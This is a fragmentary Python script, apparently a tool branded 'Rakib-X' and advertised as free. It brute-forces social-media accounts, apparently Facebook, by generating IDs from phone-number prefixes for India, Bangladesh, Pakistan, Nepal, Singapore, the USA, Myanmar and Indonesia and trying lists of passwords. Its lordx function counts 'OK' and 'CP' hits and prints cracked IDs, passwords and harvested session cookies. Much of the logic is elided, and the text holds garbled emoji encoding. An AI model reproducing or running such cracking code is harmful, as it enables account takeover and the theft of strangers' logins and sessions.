...
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TYPE       \x1b[1;97m: \x1b[1;92mFREEðŸ”¥
...
\x1b[1;93mâ”—â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”›""")  
def linex():
        print(50*'\033[36;5;14mâ”€\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)
...
def ind():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] IND CODE : +91639/+91629/+91836/+91799/+91953')
    linex()
...
def bd():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] BD CODE : 015/016/017/018/019/013/014')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
...
def pak():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] PAK CODE : +92326/+92331/+92314/+92335')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
...
def npl():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] NPL CODE : +97798/+97714')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
...
def sgp():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] SGP CODE : +65634/+65681/+65674/+65828/+65969')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
...
def usa():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] USA CODE : +17574/+13045/+13048')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
...
def myn():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] MYN CODE : +95966/+95925/+95977/+95997')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
...
def indo():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [âˆš] INDO CODE : +62888/+62878/+62882/+62838/+62877/+62813')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
...
def lordx(fid,pwx,tl):
    ...
    global oks
    global proxy
    sys.stdout.write('\r\r\033[1;92m[\033[38;5;46mCRACKINGðŸ”]\033[1;97m-[%s/%s]-[OK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps)));sys.stdout.flush()
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if ckkx=='LOCK':
                 ...
                 print('\r\r\033[1;32m[Rakib-X-OKðŸŒŸ]\033[1;33m ' +cid+ ' â€¢ ' +ps+ ' [ðŸŒº] â€¢ \033[1;97mJOIN DATE = \033[1;35m'+joined(cid)+ ' \n\033[1;33m[ðŸª]\033[1;34mCOOKIES = \033[1;32m'+coki+ '')
                 print(50*'\033[36;5;14mâ”€\033[1;37m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #print('\r\r\033[1;30m[Rakib-X-CP]  ' +uid+ ' â€¢ ' +ps+ ' \033[0;97m')
